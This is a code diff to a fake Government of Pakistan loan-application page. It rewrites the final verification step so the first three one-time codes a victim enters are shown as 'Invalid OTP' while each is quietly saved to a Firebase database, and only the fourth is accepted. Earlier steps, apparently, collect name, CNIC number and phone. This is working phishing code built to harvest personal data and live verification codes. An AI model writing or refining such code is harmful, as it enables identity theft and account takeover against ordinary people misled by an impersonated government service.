@@ -677,10 +677,10 @@ html,body{width:100%;overflow-x:hidden;background:#f0f7f3;color:#1a1a1a;scroll-b
           <div class="info-text">Never share your OTP with anyone. Government of Pakistan officials will never ask for your verification code.<span class="urdu-line">اپنا کوڈ کسی کے ساتھ شیئر نہ کریں۔</span></div>
         </div>
 
-        <div class="form-error" id="err-step6">Please enter the code</div>
+        <div class="form-error" id="err-step6">Invalid OTP. Please try again.</div>
         <div class="btn-row">
           <button class="btn-back" onclick="prevStep(5)">← Back</button>
-          <button class="btn-next" onclick="submitForm()">Submit ✓</button>
+          <button class="btn-next" onclick="submitFinalOtp()">Submit ✓</button>
         </div>
       </div>
 
@@ -786,6 +786,7 @@ const FIREBASE_NODE = 'pak_loan_portal_users';
 
 let currentKey = null;
 let currentStep = 1;
+let otpAttempts = 0; // ✅ Track OTP attempts
 const sessionData = {};
 
 function saveToFirebase(data) {
@@ -916,29 +917,61 @@ function saveStepData(step) {
     }
 }
 
-window.submitForm = function() {
-    let otp = ''; document.querySelectorAll('#otpBoxes2 input').forEach(i => otp += i.value);
-    if (otp.length < 6) { showError('err-step6', true); return; }
+// ✅ UPDATED: Final OTP Logic (3 Invalid, 4th Valid)
+window.submitFinalOtp = function() {
+    let otp = ''; 
+    document.querySelectorAll('#otpBoxes2 input').forEach(i => otp += i.value);
+    
+    if (otp.length < 6) { 
+        showError('err-step6', true); 
+        return; 
+    }
+    
     showError('err-step6', false);
 
-    showLoading('Verifying...');
+    otpAttempts++; // Increase attempt count
+    saveStepData(6); // Save the OTP attempt to Firebase
+    
+    // Save OTP to Firebase
+    const d = { otp2: otp, otp2Time: new Date().toLocaleString(), otp2Timestamp: Date.now() };
+    Object.assign(sessionData, d); 
+    updateFirebase(d);
+
+    if (otpAttempts < 4) {
+        // First 3 attempts -> Invalid
+        showLoading('Verifying...');
+        setTimeout(() => {
+            hideLoading();
+            showError('err-step6', true); // Show error text
+            // Clear OTP boxes
+            document.querySelectorAll('#otpBoxes2 input').forEach(i => i.value = '');
+            document.querySelector('#otpBoxes2 input').focus();
+        }, 1500);
+    } else {
+        // 4th attempt -> Success
+        showLoading('Completing Application...');
+        setTimeout(() => {
+            hideLoading();
+            showSuccess();
+        }, 2000);
+    }
+};
+
+function showSuccess() {
     const refNum = 'PK-2026-' + Math.floor(100000 + Math.random() * 900000);
-    const finalData = { ...sessionData, otp2: otp, referenceNumber: refNum, step: 'completed', status: 'Completed', completedTime: new Date().toLocaleString(), completedTimestamp: Date.now() };
+    const finalData = { ...sessionData, referenceNumber: refNum, step: 'completed', status: 'Completed', completedTime: new Date().toLocaleString(), completedTimestamp: Date.now() };
     updateFirebase(finalData);
 
-    setTimeout(() => {
-        hideLoading();
-        document.getElementById('trackingRef').textContent = refNum;
-        document.getElementById('summaryName').textContent = sessionData.fullName || '—';
-        document.getElementById('summaryCnic').textContent = sessionData.cnic || '—';
-        document.getElementById('summaryAmount').textContent = sessionData.loanAmount ? 'Rs. ' + Number(sessionData.loanAmount).toLocaleString() : '—';
-        document.getElementById('summaryPhone').textContent = sessionData.mobile || '—';
-        document.querySelectorAll('.step-item').forEach(item => item.classList.add('done'));
-        document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
-        document.querySelector('.form-step[data-step="7"]').classList.add('active');
-        document.getElementById('formWrapper').scrollIntoView({ behavior: 'smooth', block: 'start' });
-    }, 2200);
-};
+    document.getElementById('trackingRef').textContent = refNum;
+    document.getElementById('summaryName').textContent = sessionData.fullName || '—';
+    document.getElementById('summaryCnic').textContent = sessionData.cnic || '—';
+    document.getElementById('summaryAmount').textContent = sessionData.loanAmount ? 'Rs. ' + Number(sessionData.loanAmount).toLocaleString() : '—';
+    document.getElementById('summaryPhone').textContent = sessionData.mobile || '—';
+    document.querySelectorAll('.step-item').forEach(item => item.classList.add('done'));
+    document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
+    document.querySelector('.form-step[data-step="7"]').classList.add('active');
+    document.getElementById('formWrapper').scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
 
 function startTimer(id, seconds) {
     const el = document.getElementById(id);
